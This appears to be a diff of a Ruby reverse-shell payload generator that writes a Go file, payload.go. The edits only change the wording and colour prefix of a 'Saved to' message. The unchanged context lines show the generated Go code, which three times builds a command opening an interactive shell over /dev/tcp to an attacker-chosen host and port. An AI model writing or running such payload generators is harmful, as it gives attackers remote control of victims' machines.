@@ -83,7 +83,7 @@ if File.directory? file
                 f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         else
             file = "#{file}/payload.go"
             sleep(0.5)
@@ -100,7 +100,7 @@ if File.directory? file
                 f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         end
     else
         puts "#{e}Output directory: #{file}: does not exist!"
@@ -129,7 +129,7 @@ else
                 f.puts "    out, err = exec.Command(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\").Output()"
                 f.puts "}"
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         else
             puts "#{e}Error: #{direct}: not a directory!"
             abort()
